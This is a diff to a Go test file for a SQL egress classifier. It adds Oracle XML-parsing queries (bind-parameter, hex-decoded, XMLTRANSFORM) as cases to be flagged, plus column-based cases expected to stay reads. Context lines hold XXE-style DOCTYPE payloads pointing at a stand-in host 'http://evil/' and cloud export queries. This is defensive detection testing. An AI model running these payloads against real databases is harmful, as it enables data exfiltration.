@@ -57,6 +57,12 @@ func TestClassifySQLEgress(t *testing.T) {
 			`SELECT extractvalue(sys.xmltype(chr(60)||'!DOCTYPE r SYSTEM "http://evil/"><r/>'),'/r') FROM dual`,
 			`SELECT XMLPARSE(DOCUMENT '<!DOCTYPE r SYSTEM "http://evil/"><r/>') FROM dual`,
 			`SELECT xmltype.createxml('<!DOCTYPE r SYSTEM "http://evil/"><r/>') FROM dual`,
+			`SELECT extractvalue(xmltype(concat(concat(:1,user),:2)),'/a') FROM dual`,
+			`SELECT xmltype(:1).getStringVal() FROM dual`, `SELECT extractvalue(xmltype(:x), '/a') FROM dual`,
+			`SELECT XMLTRANSFORM(xmlelement("a"), xmltype(:1)) FROM dual`,
+			`SELECT XMLTRANSFORM(doc, :1) FROM docs`, `SELECT XMLPARSE(CONTENT :1 WELLFORMED) FROM dual`,
+			`SELECT extractvalue(xmltype(lower(doc)), '/a') FROM docs`,
+			`SELECT extractvalue(xmltype(utl_raw.cast_to_varchar2(hextoraw(:1))), '/a') FROM dual`,
 		},
 		"snowflake": {"COPY INTO @stage FROM t"},
 		"bigquery":  {"SELECT * FROM EXTERNAL_QUERY('conn','select 1')", "EXPORT DATA OPTIONS(uri='gs://x/*') AS SELECT 1"},
@@ -73,8 +79,11 @@ func TestClassifySQLEgress(t *testing.T) {
 		}
 	}
 	// XML parsed from a column stays a read
-	if p, err := ClassifySQL("oracle", "SELECT extractvalue(xmltype(doc), '/a') FROM docs"); err != nil || p.NeedsWrite() {
-		t.Errorf("oracle xmltype(column): %v %v, want a read", err, p.RuleIDs)
+	for _, q := range []string{"SELECT extractvalue(xmltype(doc), '/a') FROM docs", "SELECT xmltype(d.doc) FROM docs d",
+		"SELECT XMLPARSE(DOCUMENT doc WELLFORMED) FROM docs", "SELECT XMLTRANSFORM(doc, style) FROM docs"} {
+		if p, err := ClassifySQL("oracle", q); err != nil || p.NeedsWrite() {
+			t.Errorf("oracle %q: %v %v, want a read", q, err, p.RuleIDs)
+		}
 	}
 	// a three-part name is a database on the same server: a read
 	for _, q := range []string{"SELECT * FROM db.dbo.t", "SELECT t.a, s.b FROM db.dbo.t t JOIN s ON t.a = s.a", "SELECT 1.5"} {
